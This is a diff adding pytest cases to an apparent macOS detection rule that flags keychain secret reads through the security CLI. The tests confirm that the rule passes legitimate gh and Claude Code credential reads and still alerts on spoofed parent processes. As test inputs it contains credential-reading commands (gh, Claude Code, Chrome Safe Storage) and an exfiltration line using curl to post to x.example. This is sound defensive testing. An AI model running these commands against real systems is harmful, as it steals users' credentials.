@@ -155,3 +155,54 @@ def test_gh_token_read_needs_gh_as_the_parent():
                                parent_path="/opt/homebrew/Cellar/gh/2.83.0/bin/gh"))
     assert fires(title, ex("/usr/bin/security", cmd, platform=1,
                            parent_path="/Users/colin/Downloads/helper"))
+
+
+GH_HELPER = ("/bin/sh -c /opt/homebrew/bin/gh auth git-credential get "
+             "/opt/homebrew/bin/gh auth git-credential get")
+GH_READ = "/usr/bin/security find-generic-password -s gh:github.com -wa ColinChester"
+CLAUDE_VSCODE = ("/Users/colin/.vscode/extensions/anthropic.claude-code-2.1.330-darwin-arm64/"
+                 "resources/native-binary/claude")
+CLAUDE_READ = "security find-generic-password -a colin -w -s Claude Code-credentials"
+KEYCHAIN = "Keychain Secrets Read With the security CLI"
+
+
+@pytest.mark.parametrize("parent_path,parent_cmd", [
+    ("/bin/sh", GH_HELPER),
+    ("/bin/bash", GH_HELPER.replace("/bin/sh", "/bin/bash")),
+    ("/bin/sh", '/bin/sh -c gh auth git-credential "$@" gh auth git-credential get'),
+])
+def test_git_credential_helper_token_read_is_filtered(parent_path, parent_cmd):
+    """14 hits on Nov 23: git's credential helper ran gh through sh (issue 47)."""
+    assert not fires(KEYCHAIN, ex("/usr/bin/security", GH_READ, platform=1,
+                                  parent_path=parent_path, parent_cmdline=parent_cmd))
+
+
+@pytest.mark.parametrize("parent_cmd", [
+    GH_HELPER + "; /usr/bin/security find-generic-password -s gh:github.com -wa x",
+    GH_HELPER + " && curl -d @- https://x.example",
+    "/bin/sh -c /tmp/gh auth git-credential get",
+    "/bin/sh -c sh /Users/colin/Downloads/steal.sh",
+    "/bin/sh",
+])
+def test_spoofed_helper_parents_still_fire(parent_cmd):
+    assert fires(KEYCHAIN, ex("/usr/bin/security", GH_READ, platform=1,
+                              parent_path="/bin/sh", parent_cmdline=parent_cmd))
+
+
+def test_claude_code_reading_its_own_login_is_filtered():
+    assert not fires(KEYCHAIN, ex("/usr/bin/security", CLAUDE_READ, platform=1,
+                                  parent_path=CLAUDE_VSCODE,
+                                  parent_cmdline=CLAUDE_VSCODE + " auth status --json"))
+    for parent in ("/Users/colin/.local/share/claude/versions/2.1.4/claude",
+                   "/Users/colin/.claude/local/claude"):
+        assert not fires(KEYCHAIN, ex("/usr/bin/security", CLAUDE_READ, platform=1,
+                                      parent_path=parent))
+
+
+def test_claude_filter_is_only_for_its_own_item_and_locations():
+    # another item from the same binary, or the same item from elsewhere, still fires
+    chrome = "security find-generic-password -wa Chrome -s Chrome Safe Storage"
+    assert fires(KEYCHAIN, ex("/usr/bin/security", chrome, platform=1,
+                              parent_path=CLAUDE_VSCODE))
+    assert fires(KEYCHAIN, ex("/usr/bin/security", CLAUDE_READ, platform=1,
+                              parent_path="/private/tmp/claude"))
